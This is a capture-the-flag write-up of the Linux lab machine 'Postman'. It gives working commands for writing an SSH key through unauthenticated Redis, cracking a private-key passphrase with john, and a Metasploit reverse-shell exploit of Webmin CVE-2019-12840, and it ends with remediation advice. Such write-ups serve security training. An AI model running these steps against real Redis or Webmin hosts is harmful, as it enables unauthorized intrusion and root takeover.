| Property         | Value                                                                                                                                |
| ---------------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| **OS**           | Linux                                                                                                                                |
| **Difficulty**   | Easy                                                                                                                                 |
| **Release Date** | 2nd November, 2019                                                                                                                   |
| **State**        | Active                                                                                                                               |
| **IP**           | 10.129.2.1                                                                                                                           |
| **Techniques**   | Redis unauthenticated access, SSH key file write, SSH key passphrase cracking, `DenyUsers` bypass via `su`, Webmin authenticated RCE |
| **Tags**         | #web #redis #webmin #privesc #linux                                                                                                  |

> **Note:** The machine's IP address changes across sections of this writeup due to restarts (`10.129.2.1`, `10.129.138.65`, `10.129.140.170`).

---

## Summary

Postman is an easy Linux machine exposing a static site on port 80, Webmin on port 10000, and an unauthenticated Redis instance on port 6379. Redis accepts connections without a password, allowing an SSH public key to be written into the `redis` account's `authorized_keys` by repointing Redis' persistence path at `~/.ssh/`. An encrypted RSA key found in `/opt` belongs to `Matt`; its passphrase is cracked offline with `john`, but SSH login as `Matt` is blocked by a `DenyUsers` directive. Since the passphrase is also `Matt`'s local password, `su` bypasses the restriction for the user flag. Root is achieved by reusing `Matt`'s password against Webmin and exploiting CVE-2019-12840, an authenticated command injection in the Package Updates module.

---

## Enumeration

```
echo '10.129.2.1 postman.htb' | sudo tee -a /etc/hosts
```

Added the IP address of the machine to the `/etc/hosts` file.

### Nmap Scan

```
nmap -sC -sV postman.htb --open
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-18 17:00 EDT
Nmap scan report for postman.htb (10.129.2.1)
Host is up (0.032s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Cyber Geek's Personal Website
|_http-server-header: Apache/2.4.29 (Ubuntu)
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.56 seconds
```

The default scan discloses SSH (22), a static Apache site (80), and Webmin (10000) **MiniServ 1.910**, an exploitable release note for later.

A full-range scan discloses port **6379** (Redis):

```
nmap -p- postman.htb --open
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-18 17:00 EDT
Nmap scan report for postman.htb (10.129.2.1)
Host is up (0.036s latency).
Not shown: 65468 closed tcp ports (reset), 63 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
6379/tcp  open  redis
10000/tcp open  snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 18.28 seconds
```

A targeted scan confirms the version:

```
nmap -sC -sV postman.htb --open -p 6379
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-18 17:37 EDT
Nmap scan report for postman.htb (10.129.138.65)
Host is up (0.035s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 4.0.9

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.63 seconds
```

### Service Enumeration

#### Webmin (port 10000)

The login page yields nothing without credentials:

![](./screens/1.png)

#### Redis (port 6379)

Redis accepts connections with **no authentication required**:

```
redis-cli -h 10.129.140.170
10.129.140.170:6379> config get dir
1) "dir"
2) "/var/lib/redis"
```

`CONFIG SET` can change where Redis persists its database file on disk. Combined with unauthenticated access, this is an arbitrary-file-write primitive.

---

## Foothold

### Vulnerability — Unauthenticated Redis Write Primitive

Redis has no authentication by default and exposes commands that influence the filesystem: `CONFIG SET dir <path>` and `CONFIG SET dbfilename <name>` control where its RDB persistence file (memory snapshot) is written, and `SAVE` flushes an in-memory value to that path. Chained together, these let an unauthenticated attacker write arbitrary bytes to an arbitrary file the Redis process can create like a public key into `~/.ssh/authorized_keys` of the Redis service account.

**Attack flow:** 
- point the persistence directory at `.ssh/` 
- store a padded SSH public key as a value
- rename the output file to `authorized_keys`
- force a save 
- SSH in with the matching private key.

### Exploitation

An SSH key pair is generated locally to use as the payload:

```
ssh-keygen -t ed25519 -f redis_key -N ""
Generating public/private ed25519 key pair.
Your identification has been saved in redis_key
Your public key has been saved in redis_key.pub
The key fingerprint is:
SHA256:OWerVFPcQXj/oAl1QxcPglrYH4jUIOeWDNv0QBQfGq4 kali@kali
```

Redis's persistence directory is redirected to the `redis` service account's home `.ssh` folder (created implicitly on save):

```
redis-cli -h 10.129.140.170
10.129.140.170:6379> config set dir ./.ssh
OK
10.129.140.170:6379> config get dir
3) "dir"
4) "/var/lib/redis/.ssh"
```

The public key is padded with blank lines so Redis' RDB framing bytes don't land inside the key material, then piped into Redis as a raw value:

```
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > spaced_key.txt
cat spaced_key.txt | redis-cli -h 10.129.140.170 -x set ssh_key
OK
```

The target filename is set to `authorized_keys` and a save is forced:

```
redis-cli -h 10.129.140.170
10.129.140.170:6379> config set dir /var/lib/redis/.ssh
OK
10.129.140.170:6379> config set dbfilename "authorized_keys"
OK
10.129.140.170:6379> save
OK
```

### Access as `redis`

```
ssh -i redis_key redis@10.129.140.170
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)
...
redis@Postman:~$ id
uid=107(redis) gid=114(redis) groups=114(redis)
```

A shell is obtained as `redis`.

---

## Lateral Movement from `redis` to `Matt`

### Enumeration

A world-readable file in `/opt` stands out during manual enumeration:

```
redis@Postman:/opt$ ls
id_rsa.bak
redis@Postman:/opt$ cat id_rsa.bak
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
...
-----END RSA PRIVATE KEY-----
```

The `Proc-Type: 4,ENCRYPTED` header confirms this is a passphrase-protected private key.

### Cracking the Key Passphrase

The key is converted into a crackable hash format with `ssh2john`:

```
ssh2john id_rsa.bak > id_rsa.hash
```

```
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
computer2008     (id_rsa.bak)
1g 0:00:00:00 DONE (2026-09-21 05:04) 3.703g/s 914133p/s
```

Passphrase recovered: `computer2008`.

### SSH Access is Blocked

A direct SSH attempt as `Matt` using the decrypted key fails, despite the correct passphrase:

```
ssh -i id_rsa.bak Matt@postman.htb
Enter passphrase for key 'id_rsa.bak':
Connection closed by 10.129.140.170 port 22
```

Reviewing the SSH daemon configuration (readable as `redis`) explains why:

```
redis@Postman:/etc/ssh$ cat sshd_config
...
PubkeyAuthentication yes
PasswordAuthentication yes
...
#deny users
DenyUsers Matt
...
```

`DenyUsers Matt` rejects any SSH authentication for that username.

### User Flag

The recovered passphrase is also `Matt`'s local Linux password, so `su` is used instead of SSH:

```
redis@Postman:/etc/ssh$ su Matt
Password: computer2008
Matt@Postman:/etc/ssh$ id
uid=1000(Matt) gid=1000(Matt) groups=1000(Matt)
Matt@Postman:/etc/ssh$ cat /home/Matt/user.txt
3b6fb792240d6e259fa70c36b2bca2da
```

---

## Privilege Escalation

### Enumeration

Process listing (now as `Matt`) confirms the Webmin instance discovered in the initial scan runs as `root`:

```
Matt@Postman:~$ ps aux | grep root
...
root        786  0.0  1.8 331332 16616 ?        Ss   09:23   0:00 /usr/sbin/apache2 -k start
root        678  0.0  0.6  72296  6424 ?        Ss   09:23   0:00 /usr/sbin/sshd -D
root       1203  0.0  3.4  97604 31672 ?        S    10:21   0:00 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
root       1204  0.0  3.4  97604 31672 ?        S    10:21   0:00 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
```

The recovered passphrase is tried against Webmin using `Matt`'s username, and succeeds:

![](./screens/2.png)

Credentials confirmed: `Matt:computer2008`.

### CVE-2019-12840 — Webmin Package Updates RCE

Webmin up to and including **1.910** is vulnerable to an authenticated OS command injection in the **Software Package Updates** module: the package/update name is interpolated into a shell command without sanitization, so an authenticated user with access to that module can inject shell metacharacters that execute with the privileges of the Webmin process.

Reference: [CVE-2019-12840 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2019-12840)

### Exploitation

A Metasploit module automates the full request chain:

```
msfconsole -q
msf > search webmin

Matching Modules
================
   #   Name                                           Disclosure Date  Rank       Check  Description
   -   ----                                           ---------------  ----       -----  -----------
   7   exploit/linux/http/webmin_packageup_rce        2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
```

```
msf > use exploit/linux/http/webmin_packageup_rce
msf exploit(linux/http/webmin_packageup_rce) > set rhosts 10.129.140.170
msf exploit(linux/http/webmin_packageup_rce) > set rport 10000
msf exploit(linux/http/webmin_packageup_rce) > set ssl true
msf exploit(linux/http/webmin_packageup_rce) > set username Matt
msf exploit(linux/http/webmin_packageup_rce) > set password computer2008
msf exploit(linux/http/webmin_packageup_rce) > set lhost tun0
msf exploit(linux/http/webmin_packageup_rce) > run
```

```
[*] Started reverse TCP handler on 10.10.15.80:4444
[+] Session cookie: e0b4aac07f5aba7a769a5923fa7702e8
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (10.10.15.80:4444 -> 10.129.140.170:51060) at 2026-09-21 05:26:50 -0400
```

---

## Root Flag

```
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
bf1b096f487286942993d6f0d7a844e2
```

---

## Remediation

- **Unauthenticated Redis exposure:** Bind Redis to `127.0.0.1`, enable `requirepass`/ACLs and `protected-mode yes`, and rename dangerous commands (`CONFIG`, `SAVE`, `FLUSHALL`) in production.
- **Arbitrary file write via persistence path:** Restrict the Redis service account's OS permissions so it cannot write outside its own data directory, and ensure `~/.ssh` isn't writable by it.
- **World-readable encrypted private key:** `id_rsa.bak` should never have been left readable in `/opt`. Store keys with `600` permissions under the owning user's home directory only.
- **Password/passphrase reuse:** `computer2008` protected the SSH key, the local account, and Webmin simultaneously. Use strong, unique credentials per service.
- **`DenyUsers` as the only SSH control:** Blocking a username at the SSH layer doesn't prevent local escalation via `su`. Rotate or disable compromised credentials everywhere, not just at the SSH daemon.
- **CVE-2019-12840 (Webmin RCE):** Upgrade Webmin to 1.911+, restrict panel access to trusted admin networks, and avoid running Webmin as `root`.

---
## References

- [CVE-2019-12840 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2019-12840)
- [Metasploit Module — webmin_packageup_rce](https://www.rapid7.com/db/modules/exploit/linux/http/webmin_packageup_rce/)
- [Redis Security Documentation](https://redis.io/docs/latest/operate/oss_and_stack/management/security/)
- [HackTricks — Redis Pentesting (SSH key write-up technique)](https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html)
- [John the Ripper — ssh2john](https://github.com/openwall/john)